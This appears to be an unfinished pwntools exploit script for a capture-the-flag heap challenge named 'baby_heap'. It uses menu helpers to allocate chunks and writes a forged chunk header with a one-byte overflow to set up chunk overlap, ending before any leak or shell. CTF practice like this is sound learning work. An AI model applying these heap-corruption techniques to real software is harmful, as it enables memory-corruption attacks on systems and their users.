#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii

patchelf --set-interpreter /glibc/2.23/64/lib/ld-linux-x86-64.so.2 baby_heap_patched
patchelf --replace-needed libc.so.6 ./libc.so.6 baby_heap_patched




0x100

"""

import re, sys, os.path as path
from pwn import *
from pwnlib import gdb


context(arch="amd64", os="linux", terminal=['tmux', 'splitw', '-h'])

elf_name = path.join(path.dirname(path.abspath(__file__)), "baby_heap_patched")
_, host, port = re.split("\s+", "nc 127.0.0.1 4444")

elf = ELF(elf_name)
libc = elf.libc

io, context.log_level = (remote(host, port), "info") if len(sys.argv) > 1 else (process(elf_name), "debug")


def add(size, data):
    io.sendlineafter(b"> \n", "1")
    io.sendlineafter(b"size\n", str(size))
    io.sendafter(b"name\n", data)

def show(index):
    io.sendlineafter(b"> \n", "3")
    io.sendlineafter(b"index\n", str(index))
    return io.recvuntil("1.add\n", drop=True)

def delete(index):
    io.sendlineafter(b"> \n", "4")
    io.sendlineafter(b"index\n", str(index))


def main():
    add(0x68, "aaaaaaaa\n")  # 0
    add(0x78, "bbbbbbbb\n")  # 1
    add(0xF0, "eeeeeeee\n")  # 2
    add(0x10, "xxxxxxxx\n")  # 3  # 防止被top chunk合并
    
    

    delete(1)

    # if isinstance(io, process):
    #     gdb.attach(io)
    #     pause()


    add(0x78, flat((
        "@" * 0x10,
        0, 0x60 | 1,
        "#" * (0x70 - 0x20),
        0x60
    )) + b"a")

    # show(0)
    # show(1)
    # show(2)
    # show(3)
    # show(4)

    if isinstance(io, process):
        gdb.attach(io)
        pause()

    delete(2)
    
    

    
    io.interactive()


if __name__ == "__main__":
    main()